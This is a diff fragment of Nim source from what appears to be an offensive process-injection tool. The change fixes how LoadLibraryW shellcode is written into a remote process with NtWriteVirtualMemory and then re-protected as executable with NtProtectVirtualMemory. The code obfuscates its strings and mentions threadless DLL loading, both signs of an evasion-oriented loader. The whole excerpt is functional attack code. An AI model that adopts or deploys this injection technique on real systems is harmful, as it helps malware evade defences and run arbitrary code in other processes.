@@ -1257,8 +1257,9 @@ let RemoteLoadDllStub* = """
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-
-                ntcode = NtWriteVirtualMemory(tProcess, loadLibraryAddress, unsafeAddr loadLibraryStk[0], pageSize, &szOutput)
+                var addresstoWrite: PVOID = loadLibraryAddress
+                pageSize = 32 * sizeof(BYTE)
+                ntcode = NtWriteVirtualMemory(tProcess, addresstoWrite, unsafeAddr loadLibraryStk[0], pageSize, &szOutput)
                 if (ntcode == 0):
                     when defined(verbose):
                         echo "[+] Write Shellcode success"
@@ -1269,13 +1270,14 @@ let RemoteLoadDllStub* = """
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-
-                ntcode = NtProtectVirtualMemory(tProcess, &loadLibraryAddress, &pageSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
+                
+                var protectionRXAddress: PVOID = loadLibraryAddress
+                ntcode = NtProtectVirtualMemory(tProcess, &protectionRXAddress, &pageSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
                 if (ntcode == 0):
                     when defined(verbose):
                         echo "[+] Re-Protected to RX success"
                 when defined(verbose):
-                    echo "[+] LoadLibraryW shellcode written at : ", repr(loadLibraryAddress)
+                    echo "[+] LoadLibraryW shellcode written at : ", repr(protectionRXAddress)
 
                 var remoteModHandle: HMODULE = GetRemoteModuleHandle(tProcess, threadlessDLL)
                 if (remoteModHandle == 0):
